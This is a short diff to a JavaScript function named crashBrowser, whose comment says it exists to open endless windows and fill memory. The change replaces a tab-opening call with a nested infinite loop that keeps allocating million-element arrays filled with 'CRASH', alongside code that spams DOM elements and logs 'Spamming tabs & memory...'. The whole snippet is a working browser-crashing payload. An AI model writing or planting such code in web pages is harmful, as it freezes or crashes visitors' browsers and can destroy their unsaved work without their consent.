@@ -13,7 +13,11 @@
         function crashBrowser() {
             // Create an infinite loop that opens new windows & fills up memory
             while (true) {
-                window.open("https://google.com", "_blank");
+                let arr = [];
+while (true) {
+    arr.push(new Array(1000000).fill("CRASH"));
+}
+
                 let spam = document.createElement('div');
                 document.body.appendChild(spam);
                 console.log("Spamming tabs & memory...");
